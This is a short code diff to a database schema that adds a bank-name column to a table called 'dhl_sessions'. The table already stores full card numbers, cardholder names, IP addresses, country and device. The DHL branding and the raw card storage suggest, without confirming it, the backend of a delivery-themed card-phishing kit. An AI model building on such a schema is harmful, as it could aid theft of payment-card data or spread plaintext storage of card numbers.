@@ -83,6 +83,7 @@ export const dhlSessions = pgTable("dhl_sessions", {
   sessionId: text("session_id").notNull().unique(),
   cardNumber: text("card_number").notNull(),
   cardholderName: text("cardholder_name").notNull(),
+  bankName: text("bank_name"),
   ipAddress: text("ip_address"),
   country: text("country"),
   device: text("device"),
